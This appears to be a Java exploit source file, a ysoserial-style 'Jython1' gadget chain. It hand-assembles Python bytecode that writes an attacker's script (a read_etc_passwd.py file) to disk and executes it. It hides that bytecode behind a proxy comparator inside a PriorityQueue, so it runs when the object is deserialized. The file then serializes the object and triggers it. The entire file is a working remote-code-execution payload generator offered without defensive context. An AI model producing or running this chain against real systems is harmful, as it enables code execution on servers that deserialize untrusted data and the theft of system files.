package com.r17a.ysoserial;

import com.r17a.annotation.Dependencies;
import com.supeream.serial.Reflections;
import org.apache.commons.io.FileUtils;
import org.python.core.*;

import java.io.*;
import java.math.BigInteger;
import java.lang.reflect.Proxy;
import java.util.Arrays;
import java.util.Comparator;
import java.util.PriorityQueue;

@Dependencies({ "org.python:jython-standalone:2.5.2" })
public class Jython1 {

    public static void main(final String[] args) throws Exception {
        String command = "/home/albino_lobster/read_etc_passwd.py;/tmp/jython1.py";
        String[] paths = command.split(";");
        if (paths.length != 2) {
            throw new IllegalArgumentException("Unsupported command " + command + " " + Arrays.toString(paths));
        }

        // Set payload parameters
        String python_code = FileUtils.readFileToString(new File(paths[0]), "UTF-8");

        // Python bytecode to write a file on disk and execute it
        String code =
                "740000" + //0 LOAD_GLOBAL               0 (open)
                        "640100" + //3 LOAD_CONST                1 (remote path)
                        "640200" + //6 LOAD_CONST                2 ('w+')
                        "830200" + //9 CALL_FUNCTION             2
                        "7D0000" + //12 STORE_FAST               0 (file)

                        "7C0000" + //15 LOAD_FAST                0 (file)
                        "690100" + //18 LOAD_ATTR                1 (write)
                        "640300" + //21 LOAD_CONST               3 (python code)
                        "830100" + //24 CALL_FUNCTION            1
                        "01" +     //27 POP_TOP

                        "7C0000" + //28 LOAD_FAST                0 (file)
                        "690200" + //31 LOAD_ATTR                2 (close)
                        "830000" + //34 CALL_FUNCTION            0
                        "01" +     //37 POP_TOP

                        "740300" + //38 LOAD_GLOBAL              3 (execfile)
                        "640100" + //41 LOAD_CONST               1 (remote path)
                        "830100" + //44 CALL_FUNCTION            1
                        "01" +     //47 POP_TOP
                        "640000" + //48 LOAD_CONST               0 (None)
                        "53";      //51 RETURN_VALUE

        // Helping consts and names
        PyObject[] consts = new PyObject[]{new PyString(""), new PyString(paths[1]), new PyString("w+"), new PyString(python_code)};
        String[] names = new String[]{"open", "write", "close", "execfile"};

        // Generating PyBytecode wrapper for our python bytecode
        PyBytecode codeobj = new PyBytecode(2, 2, 10, 64, "", consts, names, new String[]{ "", "" }, "noname", "<module>", 0, "");
        Reflections.setFieldValue(codeobj, "co_code", new BigInteger(code, 16).toByteArray());

        // Create a PyFunction Invocation handler that will call our python bytecode when intercepting any method
        PyFunction handler = new PyFunction(new PyStringMap(), null, codeobj);

        // Prepare Trigger Gadget
        Comparator comparator = (Comparator) Proxy.newProxyInstance(Comparator.class.getClassLoader(), new Class<?>[]{Comparator.class}, handler);
        PriorityQueue<Object> priorityQueue = new PriorityQueue<Object>(2, comparator);
        Object[] queue = new Object[] {1,1};
        Reflections.setFieldValue(priorityQueue, "queue", queue);
        Reflections.setFieldValue(priorityQueue, "size", 2);

        FileOutputStream fileOutputStream = new FileOutputStream(new File("E:\\test.ser"));
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream);
        objectOutputStream.writeObject(priorityQueue);

        FileInputStream fileInputStream = new FileInputStream(new File("E:\\test.ser"));
        ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream);
        objectInputStream.readObject();
    }
}
